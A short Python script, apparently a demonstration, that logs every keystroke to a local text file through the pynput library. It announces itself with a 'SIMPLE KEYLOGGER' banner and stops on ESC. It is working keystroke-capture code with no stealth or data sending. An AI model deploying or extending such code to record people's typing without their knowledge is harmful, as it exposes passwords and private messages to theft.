from pynput.keyboard import Key, Listener

# File where keystrokes will be stored
LOG_FILE = "key_log.txt"

print("=" * 45)
print("         SIMPLE KEYLOGGER")
print("=" * 45)
print("Logging keystrokes...")
print("Press ESC to stop.\n")


def on_press(key):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as file:
            # Record normal characters
            if hasattr(key, "char") and key.char is not None:
                file.write(key.char)

            # Record special keys in a readable format
            elif key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            elif key == Key.tab:
                file.write("[TAB]")
            elif key == Key.backspace:
                file.write("[BACKSPACE]")
            else:
                file.write(f"[{key}]")

    except Exception as e:
        print(f"Error: {e}")


def on_release(key):
    # Stop logging when ESC is pressed
    if key == Key.esc:
        print("\nLogging stopped.")
        return False


# Start keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()